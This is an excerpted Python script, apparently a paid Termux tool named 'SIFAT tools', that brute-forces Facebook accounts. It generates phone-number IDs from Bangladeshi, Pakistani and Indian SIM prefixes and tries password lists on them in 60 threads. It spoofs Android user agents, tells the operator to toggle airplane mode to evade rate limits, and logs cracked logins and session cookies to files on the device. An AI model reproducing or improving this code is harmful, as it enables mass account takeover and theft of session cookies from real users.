...
def line():
	print(f'{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
############------[ RANDOM SYS ]------#########
BDX=f" {W}[{G}+{E}] BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
INDX=f" {W}[{G}+{E}] IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX=f" {W}[{G}+{E}] PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX=f" [{G}+{E}] EXAMPLE : {G}10000{W},{G}20000{W},{G}30000{W},{G}40000{W},{G}99999{W}"
############------[ A SYS ]------#########
...
# --- [ LOGIN FUNCTION ] ---
def login_system():
    # এখানে আপনার পছন্দমতো ইউজার এবং পাসওয়ার্ড সেট করুন
    correct_user = "sifat"
    correct_pass = "sm"
    ...
    print(f"\x1b[38;5;49m     ███████ ██ ██      ██   ██    ██")
    print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f" \x1b[1;97m[\x1b[38;5;48m•\x1b[1;97m]\x1b[1;97m OWNER  - MD. SIFAT HOSSAIN")
    print(f" \x1b[1;97m[\x1b[38;5;48m•\x1b[1;97m] LOGIN SYSTEM - SIFAT TOOLS")
    print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    user = input(" \x1b[1;97m[\x1b[38;5;48m•\x1b[1;97m] USERNAME : \033[1;32m")
    pasw = input(" \x1b[1;97m[\x1b[38;5;48m•\x1b[1;97m] PASSWORD : \033[1;32m")
    
    if user == correct_user and pasw == correct_pass:
        print("\n\033[1;32m [✓] ACCESS GRANTED! WELCOME.")
        os.system('espeak -a 300 "Access Granted"')
        time.sleep(2)
    else:
        print("\n\033[1;31m [×] INVALID USER OR PASSWORD!")
        os.system('espeak -a 300 "Invalid User or Password"')
        sys.exit()

# স্ক্রিপ্ট রান করার সময় এই ফাংশনটি কল করবেন
login_system()
...
os.system('espeak -a 300 "Assalamu olaikum, welcome to Sifat tools"')

# Open Facebook group (Termux)
os.system('termux-open "https://www.facebook.com/share/g/1JUdBJXi6J/"')
def logo():
 ...
 {G4}███████ ██ ██      ██   ██    ██{W}
\n{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[1;97m[\x1b[38;5;48m•\x1b[1;97m]\x1b[1;97m OWNER      : MD. SIFAT HOSSAIN
 {W}[{G3}•{W}]{W} GITHUB     : SIFAT-VAI143
 {W}[{G3}•{W}]{W} FACEBOOK   : Md. Sifat Hossain 
 {W}[{G3}•{W}]{W} TOOL       : RANDOM
 {W}[{G3}•{W}]{W} TYPE       : PAID
 {W}[{G3}•{W}]{W} VERSION    : 0.02                      
{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
	print(f' \x1b[1;97m[\x1b[1;92mA\x1b[1;97m]\x1b[1;97mRANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W}RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W}RANDOM CRACK [{G}INDIA{W}]')
	line()
...
def rmenu1():
	...
	code=input(f'{chc}');print(f'{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
	print(f'{LIMITX}');line()
	limit=int(input(f' {W}[{G3}•{W}]{W} Limit : {G}'))
	print(f'{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}');print(f'{CPG}');line()
	cx=input(f'[{chc}')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f'{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}');print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	...
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' {W}[{G3}•{W}]{W}TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}]\033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}]\033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{G}•{W}]\033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(f'{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')
		for rngx in xode:
			id=code+rngx
...
def dalvik_ua_pro():
    ...
    # slight variation add
    dalvik_ver = f"2.1.0"
    
    ua = f"Dalvik/{dalvik_ver} (Linux; U; Android {android}; {device} Build/{build})"
    return ua
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}SIFAT-M1{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[SIFAT-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/SIFAT-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[SIFAT-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/SIFAT-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[SIFAT-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/SIFAT-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
